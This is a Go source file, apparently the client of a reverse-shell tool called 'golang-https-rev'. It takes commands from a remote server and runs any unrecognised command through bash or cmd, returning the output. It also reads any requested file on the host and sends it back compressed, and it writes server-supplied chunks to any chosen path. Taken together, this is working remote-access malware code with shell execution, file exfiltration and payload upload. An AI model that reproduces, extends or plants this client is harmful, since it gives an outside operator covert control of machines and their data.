package client

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"golang-https-rev/pkg/compression"
	"golang-https-rev/pkg/protocol"
)

// handlePingCommand handles PING requests from the server
func (rc *ReverseClient) handlePingCommand() error {
	rc.writer.WriteString(protocol.CmdPong + "\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// handleStartUploadCommand handles the START_UPLOAD command to prepare for file upload
func (rc *ReverseClient) handleStartUploadCommand(command string) error {
	parts := strings.SplitN(command, " ", 3)
	if len(parts) != 3 {
		rc.writer.WriteString("Invalid start_upload command\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("invalid start_upload command: %s", command)
	}
	remotePath := parts[1]
	rc.currentUploadPath = remotePath
	rc.uploadChunks = []string{}
	rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// handleUploadChunkCommand handles receiving and storing a single file chunk
func (rc *ReverseClient) handleUploadChunkCommand(command string) error {
	if rc.currentUploadPath == "" {
		rc.writer.WriteString("No active upload\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("no active upload session")
	}
	chunk := strings.TrimPrefix(command, protocol.CmdUploadChunk+" ")
	rc.uploadChunks = append(rc.uploadChunks, chunk)
	rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// handleEndUploadCommand handles finalizing a file upload and writing to disk
func (rc *ReverseClient) handleEndUploadCommand(command string) error {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		rc.writer.WriteString("Invalid end_upload command\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("invalid end_upload command: %s", command)
	}

	if rc.currentUploadPath == "" {
		rc.writer.WriteString("No active upload\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("no active upload session")
	}

	// Decompress and write chunks to file
	decompressedData := []byte{}
	for _, chunk := range rc.uploadChunks {
		decompressed, err := compression.DecompressHex(chunk)
		if err != nil {
			rc.writer.WriteString(fmt.Sprintf("Decompression error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
			rc.writer.Flush()
			return fmt.Errorf("decompression failed: %w", err)
		}
		decompressedData = append(decompressedData, decompressed...)
	}

	// Write to file
	err := os.WriteFile(rc.currentUploadPath, decompressedData, 0644)
	if err != nil {
		rc.writer.WriteString(fmt.Sprintf("Write error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("failed to write file: %w", err)
	}

	totalBytes := len(decompressedData)
	rc.writer.WriteString(fmt.Sprintf("OK\n%d\n", totalBytes) + protocol.EndOfOutputMarker + "\n")
	rc.writer.Flush()

	// Cleanup
	rc.currentUploadPath = ""
	rc.uploadChunks = []string{}
	return nil
}

// handleDownloadCommand handles file download requests
func (rc *ReverseClient) handleDownloadCommand(command string) error {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		rc.writer.WriteString("Invalid download command\n" + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("invalid download command: %s", command)
	}

	filePath := parts[1]
	data, err := os.ReadFile(filePath)
	if err != nil {
		rc.writer.WriteString(fmt.Sprintf("Error reading file: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("failed to read file: %w", err)
	}

	// Compress data
	compressed, err := compression.CompressToHex(data)
	if err != nil {
		rc.writer.WriteString(fmt.Sprintf("Compression error: %v\n", err) + protocol.EndOfOutputMarker + "\n")
		rc.writer.Flush()
		return fmt.Errorf("compression failed: %w", err)
	}

	rc.writer.WriteString(compressed + "\n" + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// handleExitCommand handles the EXIT command to gracefully close connection
func (rc *ReverseClient) handleExitCommand() error {
	return nil // Signal to return from main loop
}

// handleShellCommand executes a shell command and returns output
func (rc *ReverseClient) handleShellCommand(command string) error {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		// Log error but send output anyway
		log.Printf("Command execution error: %v", err)
	}

	rc.writer.WriteString(string(output) + protocol.EndOfOutputMarker + "\n")
	return rc.writer.Flush()
}

// processCommand processes a single command and returns whether to continue
func (rc *ReverseClient) processCommand(command string) (shouldContinue bool, err error) {
	// Handle keepalive ping
	if command == protocol.CmdPing {
		return true, rc.handlePingCommand()
	}

	// Log command but avoid logging data payloads for upload chunks
	if strings.HasPrefix(command, protocol.CmdUploadChunk+" ") {
		log.Printf("Received command: %s <data>", protocol.CmdUploadChunk)
	} else {
		log.Printf("Received command: %s", command)
	}

	if command == protocol.CmdExit {
		return false, rc.handleExitCommand()
	}

	// Handle file transfers
	if strings.HasPrefix(command, protocol.CmdStartUpload+" ") {
		return true, rc.handleStartUploadCommand(command)
	}

	if strings.HasPrefix(command, protocol.CmdUploadChunk+" ") {
		return true, rc.handleUploadChunkCommand(command)
	}

	if strings.HasPrefix(command, protocol.CmdEndUpload+" ") {
		return true, rc.handleEndUploadCommand(command)
	}

	if strings.HasPrefix(command, protocol.CmdDownload+" ") {
		return true, rc.handleDownloadCommand(command)
	}

	// Default: execute as shell command
	return true, rc.handleShellCommand(command)
}
